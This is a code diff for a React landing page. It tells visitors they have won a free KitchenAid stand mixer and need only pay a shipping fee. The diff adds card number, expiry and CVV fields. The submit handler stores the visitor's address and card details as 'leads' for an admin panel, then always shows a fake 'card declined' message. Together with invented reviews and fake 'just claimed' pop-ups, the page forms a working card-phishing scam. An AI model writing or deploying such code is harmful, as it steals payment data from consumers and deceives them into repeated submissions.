@@ -5,6 +5,8 @@
 
 import { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
+import { Routes, Route, Link } from 'react-router-dom';
+import Admin from './Admin.tsx';
 import { 
   ShieldCheck, 
   Truck, 
@@ -16,10 +18,11 @@ import {
   Package,
   CreditCard,
   MapPin,
-  User
+  User,
+  AlertCircle
 } from 'lucide-react';
 
-export default function App() {
+function LandingPage() {
   const [step, setStep] = useState(1);
   const [timeLeft, setTimeLeft] = useState(299); // 5 minutes
   const [formData, setFormData] = useState({
@@ -29,8 +32,13 @@ export default function App() {
     city: '',
     zip: '',
     email: '',
-    phone: ''
+    phone: '',
+    cardNumber: '',
+    expiry: '',
+    cvv: ''
   });
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [error, setError] = useState<string | null>(null);
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -64,6 +72,26 @@ export default function App() {
 
   const handleNext = () => {
     if (step < 3) setStep(step + 1);
+  };
+
+  const handleSubmit = () => {
+    setIsSubmitting(true);
+    setError(null);
+    
+    // Save to localStorage for admin panel
+    const leads = JSON.parse(localStorage.getItem('biteshub_leads') || '[]');
+    const newLead = {
+      ...formData,
+      id: Math.random().toString(36).substr(2, 9),
+      timestamp: new Date().toISOString()
+    };
+    localStorage.setItem('biteshub_leads', JSON.stringify([newLead, ...leads]));
+
+    // Simulate transaction failure after delay
+    setTimeout(() => {
+      setIsSubmitting(false);
+      setError("Transaction Failed: Your card was declined. Please try another payment method or contact your bank.");
+    }, 2000);
   };
 
   return (
@@ -113,8 +141,8 @@ export default function App() {
               <span className="text-blue-600">You're Today's Winner</span>
             </h1>
             <p className="text-lg text-slate-600 max-w-xl">
-              As part of our 2024 Loyalty Program, you have been selected to receive a brand new 
-              <span className="font-bold text-slate-900"> Dyson Supersonic™ Hair Dryer</span>. 
+              As part of our 2026 Loyalty Program, you have been selected to receive a brand new 
+              <span className="font-bold text-slate-900"> KitchenAid® Artisan® Series Stand Mixer</span>. 
               Just cover the small shipping fee to claim your prize.
             </p>
           </motion.div>
@@ -129,8 +157,8 @@ export default function App() {
               MSRP: $429.99 → $0.00
             </div>
             <img 
-              src="https://picsum.photos/seed/dyson/800/600" 
-              alt="Dyson Supersonic" 
+              src="https://picsum.photos/seed/mixer/800/600" 
+              alt="KitchenAid Stand Mixer" 
               className="w-full h-auto rounded-2xl transition-transform duration-500 group-hover:scale-105"
               referrerPolicy="no-referrer"
             />
@@ -165,7 +193,7 @@ export default function App() {
           {/* Reviews/Trust Section */}
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             {[
-              { name: "Sarah J.", text: "Received mine in 3 days! Can't believe it's actually real. Best hair dryer ever.", rating: 5 },
+              { name: "Sarah J.", text: "Received mine in 3 days! Can't believe it's actually real. Best stand mixer ever.", rating: 5 },
               { name: "Michael R.", text: "The shipping was fast and the product is genuine. Highly recommend BitesHub.", rating: 5 }
             ].map((review, i) => (
               <div key={i} className="bg-white p-6 rounded-2xl border border-slate-100 shadow-sm">
@@ -282,7 +310,7 @@ export default function App() {
                         </div>
                         <div>
                           <h3 className="font-bold text-slate-900">Shipping Address</h3>
-                          <p className="text-xs text-slate-500">Where should we deliver your Dyson?</p>
+                          <p className="text-xs text-slate-500">Where should we deliver your KitchenAid?</p>
                         </div>
                       </div>
 
@@ -350,7 +378,7 @@ export default function App() {
 
                       <div className="bg-slate-50 p-4 rounded-2xl border border-slate-200 space-y-3">
                         <div className="flex justify-between text-sm">
-                          <span className="text-slate-500">Dyson Supersonic™</span>
+                          <span className="text-slate-500">KitchenAid® Stand Mixer</span>
                           <span className="font-bold text-green-600">FREE</span>
                         </div>
                         <div className="flex justify-between text-sm">
@@ -363,6 +391,73 @@ export default function App() {
                         </div>
                       </div>
 
+                      <div className="space-y-4">
+                        <div className="space-y-1.5">
+                          <label className="text-xs font-bold text-slate-500 uppercase">Card Number</label>
+                          <div className="relative">
+                            <input 
+                              type="text" 
+                              placeholder="0000 0000 0000 0000"
+                              maxLength={19}
+                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
+                              value={formData.cardNumber}
+                              onChange={(e) => {
+                                let value = e.target.value.replace(/\D/g, '');
+                                value = value.match(/.{1,4}/g)?.join(' ') || value;
+                                setFormData({...formData, cardNumber: value.slice(0, 19)});
+                              }}
+                            />
+                            <CreditCard className="w-5 h-5 text-slate-300 absolute right-4 top-1/2 -translate-y-1/2" />
+                          </div>
+                        </div>
+                        <div className="grid grid-cols-2 gap-4">
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-bold text-slate-500 uppercase">Expiry Date</label>
+                            <input 
+                              type="text" 
+                              placeholder="MM/YY"
+                              maxLength={5}
+                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
+                              value={formData.expiry}
+                              onChange={(e) => {
+                                let value = e.target.value.replace(/\D/g, '');
+                                if (value.length > 2) {
+                                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                                }
+                                setFormData({...formData, expiry: value});
+                              }}
+                            />
+                          </div>
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-bold text-slate-500 uppercase">CVV</label>
+                            <input 
+                              type="text" 
+                              placeholder="123"
+                              maxLength={3}
+                              className="w-full px-4 py-3 rounded-xl border border-slate-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
+                              value={formData.cvv}
+                              onChange={(e) => setFormData({...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3)})}
+                            />
+                          </div>
+                        </div>
+                      </div>
+
+                      <AnimatePresence>
+                        {error && (
+                          <motion.div 
+                            initial={{ opacity: 0, height: 0 }}
+                            animate={{ opacity: 1, height: 'auto' }}
+                            exit={{ opacity: 0, height: 0 }}
+                            className="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3"
+                          >
+                            <AlertCircle className="w-5 h-5 text-red-600 shrink-0" />
+                            <p className="text-xs text-red-800 leading-relaxed font-bold">
+                              {error}
+                            </p>
+                          </motion.div>
+                        )}
+                      </AnimatePresence>
+
                       <div className="p-4 bg-blue-50 rounded-xl border border-blue-100 flex gap-3">
                         <ShieldCheck className="w-5 h-5 text-blue-600 shrink-0" />
                         <p className="text-xs text-blue-800 leading-relaxed">
@@ -371,10 +466,12 @@ export default function App() {
                       </div>
 
                       <button 
-                        className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-green-200 transition-all flex items-center justify-center gap-2 group"
+                        onClick={handleSubmit}
+                        disabled={isSubmitting}
+                        className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-green-200 transition-all flex items-center justify-center gap-2 group disabled:opacity-50 disabled:cursor-not-allowed"
                       >
-                        Complete Order
-                        <ChevronRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />
+                        {isSubmitting ? 'Processing...' : 'Complete Order'}
+                        {!isSubmitting && <ChevronRight className="w-5 h-5 transition-transform group-hover:translate-x-1" />}
                       </button>
                     </motion.div>
                   )}
@@ -416,7 +513,7 @@ export default function App() {
             <span className="text-lg font-bold tracking-tight">BitesHub</span>
           </div>
           <p className="text-xs text-slate-400 max-w-2xl mx-auto leading-relaxed">
-            © 2024 BitesHub Rewards. All rights reserved. This sweepstakes is not affiliated with or endorsed by Dyson. 
+            © 2026 BitesHub Rewards. All rights reserved. This sweepstakes is not affiliated with or endorsed by KitchenAid. 
             Participants must be 18+ and residents of the United States. Terms and conditions apply. 
             Customer Service: 1-877-646-2263
           </p>
@@ -424,6 +521,7 @@ export default function App() {
             <a href="#" className="hover:text-blue-600 transition-colors">Terms</a>
             <a href="#" className="hover:text-blue-600 transition-colors">Privacy</a>
             <a href="#" className="hover:text-blue-600 transition-colors">Contact</a>
+            <Link to="/admin" className="hover:text-blue-600 transition-colors">Admin</Link>
           </div>
         </div>
       </footer>
@@ -442,11 +540,20 @@ export default function App() {
             </div>
             <div>
               <p className="text-sm font-bold text-slate-900">{notification.name} from {notification.city}</p>
-              <p className="text-xs text-slate-500">Just claimed their Dyson Supersonic™</p>
+              <p className="text-xs text-slate-500">Just claimed their KitchenAid® Stand Mixer</p>
             </div>
           </motion.div>
         )}
       </AnimatePresence>
     </div>
+  );
+}
+
+export default function App() {
+  return (
+    <Routes>
+      <Route path="/" element={<LandingPage />} />
+      <Route path="/admin" element={<Admin />} />
+    </Routes>
   );
 }
